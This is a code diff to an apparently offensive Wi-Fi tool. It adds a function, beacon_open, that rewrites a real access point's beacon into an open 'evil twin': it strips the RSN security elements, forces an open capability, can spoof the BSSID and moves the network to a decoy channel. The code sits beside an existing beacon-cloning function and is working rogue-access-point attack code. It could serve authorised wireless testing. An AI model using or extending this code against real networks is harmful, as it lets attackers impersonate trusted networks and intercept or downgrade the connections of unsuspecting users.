@@ -15,6 +15,7 @@ from airscope.dot11.eapol import data_header, eapol_key, set_mic, LLC_SNAP_EAPOL
 from airscope.dot11.mac import mac_header
 
 _CAP_ESS_PRIVACY = 0x0011
+_CAP_ESS = 0x0001
 _BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
 _ELEMID_DS = 0x03
 _ELEMID_RSN = 0x30
@@ -99,5 +100,30 @@ def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] 
         elif tag_id == _ELEMID_VHT_OP:
             kept += _vht_op_to_20mhz(elem)
         elif tag_id != _ELEMID_RSNXE:
+            kept += elem
+    return bytes(head) + bytes(kept)
+
+
+def beacon_open(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
+    """The target's beacon rewritten to an OPEN twin (no RSN/RSNXE, ESS-only capability)."""
+    if len(real_beacon) < _BEACON_HEAD:
+        raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
+    head = bytearray(real_beacon[:_BEACON_HEAD])
+    head[22:24] = struct.pack("<H", _CAP_ESS)
+    if bssid is not None:
+        head[10:16] = bssid
+        head[16:22] = bssid
+    tags = real_beacon[_BEACON_HEAD:]
+    kept = bytearray()
+    for tag_id, _body, elem in iter_information_elements(tags):
+        if tag_id in (_ELEMID_RSN, _ELEMID_RSNXE):
+            continue
+        elif tag_id == _ELEMID_DS:
+            kept += ds_param_ie(decoy_channel)
+        elif tag_id == _ELEMID_HT_OP:
+            kept += _ht_op_to_channel(elem, decoy_channel)
+        elif tag_id == _ELEMID_VHT_OP:
+            kept += _vht_op_to_20mhz(elem)
+        else:
             kept += elem
     return bytes(head) + bytes(kept)
